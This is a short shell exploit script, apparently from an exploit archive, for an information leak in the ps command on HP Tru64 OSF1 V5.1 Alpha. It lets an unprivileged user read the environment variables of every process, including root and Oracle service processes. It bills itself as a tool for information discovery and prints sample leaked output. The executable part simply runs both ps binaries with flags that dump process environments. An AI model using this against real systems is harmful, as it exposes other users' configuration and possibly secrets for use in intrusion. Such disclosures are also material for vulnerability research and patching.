#!/bin/ksh
#
# osf1tru64ps.ksh exploit
# Tested on OSF1 V5.1 1885 alpha
#
# ps executable - information leak
# 
# Author: Andrea "bunker" Purificato
#         http://rawlab.mindcreations.com
#
# the "ps" command (also /usr/ucb/ps) on HP OSF1 v5.1 Alpha,
# developed without an eye to security, allows unprivileged users to see
# values of all processes environment variables.
#
# Useful during information discovery.
#
# fake_uname> uname -a           
# OSF1 fake_uname V5.1 1885 alpha
# 
# fake_uname> id
# uid=301(fake_user) gid=216(fake_gid)
#
# fake_uname> /usr/ucb/ps auxeww 
# USER            PID %CPU %MEM   VSZ  RSS TTY      S    STARTED         TIME COMMAND
# ...
# ...
# root        1038875  0.0  0.0 2.02M 184K ??       I    11:39:03     0:00.01 sleep 55 MANPATH=/usr/share/man:/usr/dt/share/man:/usr/local/man:/usr/opt/networker/man:/usr/local/openssh/bin PATH=/sbin:/bin:/usr/bin:/usr/sbin:/sbin:/bin:/usr/bin:/usr/sbin:/sbin:/usr/sbin:/usr/bin:/usr/ccs/bin:/usr/bin/X11:/usr/local:/usr/local/openssh/bin:/usr/opt/networker/bin LOGNAME=root USER=root SHELL=/bin/ksh HOME=/ TERM=vt100 PWD=/opt/AmosLite_Client...
# ...
# ...
# root        1009950  0.0  0.0 2.73M 840K ??       I <    Sep 30     0:31.22 /usr/sbin/auditd -l /LOG_SOURCE/audit/auditlog HOME=/ LOGNAME=root MANPATH=/usr/share/man:/usr/dt/share/man:/usr/local/man:/usr/opt/networker/man:/usr/local/openssh/bin PATH=/sbin:/usr/sbin:/usr/bin:/usr/ccs/bin:/usr/bin/X11:/usr/local:/usr/local/openssh/bin:/usr/opt/networker/bin PWD=/var/audit SHELL=/bin/ksh TERM=xterm USER=root...
# ...
# ...
# oracle       541177  0.0  0.0 28.2M 3.4M ??       S      Sep 01     0:07.00 /app/oracle/product/9.2.0/Apache/Apache/bin/httpd -d /app/oracle/product/9.2.0/Apache/Apache HOME=/app/oracle LD_LIBRARY_PATH=/app/oracle/product/9.2.0/lib:/app/oracle/product/9.2.0/lib:/app/oracle/product/9.2.0/obackup/lib: LOGNAME=oracle NLS_LANG=AMERICAN_AMERICA.WE8MSWIN1252 OBK_HOME=/app/oracle/product/9.2.0/obackup ORACLE_BACKUP=/app/oracle/BACKUP ORACLE_BASE=/app/oracle ORACLE_DOC=/app/oracle/product/9.2.0/oradoc ORACLE_HOME=/app/oracle/product/9.2.0 ORACLE_PATH=/app/oracle/product/9.2.0/oracle ORACLE_SID=...
# ...
# ...
#
echo "Tru64 Alpha OSF1 V5.1 1885  - ps information leak"
echo "Andrea \"bunker\" Purificato - http://rawlab.mindcreations.com"
echo ""
echo "Default ps executable: "
ps auxewww

echo "/usr/ucb/ps executable: "
/usr/ucb/ps auxewww

# milw0rm.com [2007-02-06]